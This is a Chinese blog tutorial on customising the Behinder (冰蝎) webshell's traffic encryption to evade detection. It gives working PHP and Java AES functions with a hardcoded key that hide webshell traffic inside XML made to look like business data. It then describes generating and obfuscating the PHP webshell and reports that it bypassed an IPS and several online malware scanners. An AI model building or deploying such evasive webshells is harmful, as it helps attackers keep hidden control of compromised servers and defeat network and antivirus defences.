## **前言**

目前各大厂商对冰蝎默认的加密流量已经能够识别了，跟着大佬的思路也来学习学习加密的api以及如何绕过，原文如下：

> https://xz.aliyun.com/t/12453#toc-0

主要思路就是对通信流量加入一些业务数据进行混淆，会更容易绕过防护设备。

## 加密算法XML格式分析

本文只分析XML格式，混淆方式就是加密的文本插入到XML的模板字符串里，如默认的加密流量如下：

![1691223282_64ce04f2c89b904103eb0.png!small](https://image.3001.net/images/20230805/1691223282_64ce04f2c89b904103eb0.png!small)

添加XML模板字符后的通信流量如下：![1691223413_64ce0575e1276b3b6c48c.png!small](https://image.3001.net/images/20230805/1691223413_64ce0575e1276b3b6c48c.png!small)

  

有了自定义加解密算法，加上业务数据进行混淆，绕过还是比较轻松的，下面来看看冰蝎如何自定义加解密算法

##  **冰蝎自定义加密使用**

点开冰蝎传输协议配置，可以看到内置了默认的5个加密协议，而且可以自定义加密算法，我这里还是以AES举例。为了更好测试，可以先在编译器里调试好了再放到冰蝎里

![1691224252_64ce08bcb01e679865e2e.png!small](https://image.3001.net/images/20230805/1691224252_64ce08bcb01e679865e2e.png!small)

### 远程

需要注意，自定义加解密分为本地和远程，必须都验证后再生成服务端

远程的需要有已经能连接好的的webshell来测试，不然会提示验证shell连接失败，建议可以用本地靶场先来测试

![1691224437_64ce097572871221cc43d.png!small](https://image.3001.net/images/20230805/1691224437_64ce097572871221cc43d.png!small)

  

我这里测试是php环境，就用php代码展示，加解密代码如下，

加密函数：

> function Encrypt($data) {  
> $xml = '<?xml
> version="1.0"?><user><id>1</id><content>DaYer0</content></user>';  
> $key = "ffffcmldjt12138s";
>
> $encrypted = base64_encode(openssl_encrypt($data, "AES-128-ECB", $key,
> OPENSSL_RAW_DATA));  
> return $str_replace("DaYer0", $encrypted, $xml);  
> }

简单分析一下，首先定义XML字符串，定义16位的key（AES必须16位）

然后使用`openssl_encrypt`函数对`$data`进行加密，使用了指定的加密算法（AES-128-ECB）和密钥，得到`$encrypted`，再用Base64编码加密后的二进制数据，防止未知字符出现乱码。

最后再用加密好的数据替换XML里面的`DaYer0`

解密函数：

> function Decrypt($data) {  
> $key = "ffffcmldjt12138s";
>
> $xml = simplexml_load_string($data);  
> $encodedData = (string) $xml->content;
>
> $decrypted = openssl_decrypt(base64_decode($encodedData), "AES-128-ECB",
> $key, OPENSSL_RAW_DATA);
>
> return $decrypted;  
> }
>
>  
>

解密同理，先使用`simplexml_load_string`函数将传入的XML字符串`$data`加载为一个SimpleXMLElement对象，将XML字符串解析为一个可操作的对象，从中获取<content>标签里加密的内容，并转换成字符串，再使用`openssl_decrypt`函数对解码后的数据进行解密，验证通过即可

![1691229043_64ce1b73d1409ef00202a.png!small?1691229044246](https://image.3001.net/images/20230805/1691229043_64ce1b73d1409ef00202a.png!small?1691229044246)

  

### 本地

本地只能使用java来编写，并且不能导入包，只能使用完全限定名的格式：包名.类名 来使用

加密函数如下：

> private byte[] Encrypt(byte[] data) throws Exception  
> {  
> String xml="<?xml
> version=\"1.0\"?><user><id>1</id><content>DaYer0</content></user>";  
> String key = "ffffcmldjt12138s";  
> String transformation = "AES/ECB/PKCS5Padding";
>
> //创建加密对象
>
> javax.crypto.Cipher cipher =
> javax.crypto.Cipher.getInstance(transformation);
>
> //创建加密规则  
> javax.crypto.spec.SecretKeySpec secretKeySpec = new
> javax.crypto.spec.SecretKeySpec(key.getBytes(), "AES");
>
> //加密初始化  
> cipher.init(javax.crypto.Cipher.ENCRYPT_MODE,secretKeySpec);
>
> //调用加密方法
>
> byte[] bytes = cipher.doFinal(data);  
> String encode = java.util.Base64.getEncoder().encodeToString(bytes);
>
> xml=xml.replace("DaYer0",encode);  
> return xml.getBytes();  
> }

还是先定义XML字符串，key，

然后是AES加密：创建cipher加密对象，创建secretKeySpec加密规则，再加密初始化，实际加密就调用doFinal方法，加密后依然对字符串Base64编码，以免乱码

最后返回字节数组

解密函数：

> private byte[] Decrypt(byte[] data) throws Exception  
> {  
> java.io.ByteArrayOutputStream bos=new java.io.ByteArrayOutputStream();  
> bos.write(data,46,data.length-63);  
> String input = new String(bos.toByteArray());  
> //定义key（16位）  
> String key = "ffffcmldjt12138s";  
> String transformation = "AES/ECB/PKCS5Padding";  
> //创建解密对象  
> javax.crypto.Cipher cipher =
> javax.crypto.Cipher.getInstance(transformation);  
> //创建解密规则  
> javax.crypto.spec.SecretKeySpec secretKeySpec = new
> javax.crypto.spec.SecretKeySpec(key.getBytes(), "AES");  
> //解密初始化  
> cipher.init(javax.crypto.Cipher.DECRYPT_MODE,secretKeySpec);  
> //调用解密方法  
> byte[] bytes1 = java.util.Base64.getDecoder().decode(input);  
> byte[] bytes = cipher.doFinal(bytes1);  
> return bytes;  
> }

先创建ByteArrayOutputStream对象bos，来处理传入的字节数组，只写入加密的数据

然后还是同上创建解密对象，解密初始化等，调用解密方法前不要忘了Base64解码

验证通过即可：

![1691232907_64ce2a8b7ee565c475138.png!small?1691232908109](https://image.3001.net/images/20230805/1691232907_64ce2a8b7ee565c475138.png!small?1691232908109)

  

本地远程都验证通过后就可以生成服务端了，经测试，过某ips是OK的

我测试的环境是php，可以再去在线的php混淆网站里去加密混淆一波，一个免杀的马儿就OK啦

随便找了个在线的测试，阿里云，微步都过了，freebuf的却检测了出来![1691233381_64ce2c6561573964fa065.png!small?1691233382134](https://image.3001.net/images/20230805/1691233381_64ce2c6561573964fa065.png!small?1691233382134)

##  **总结**

冰蝎牛的！

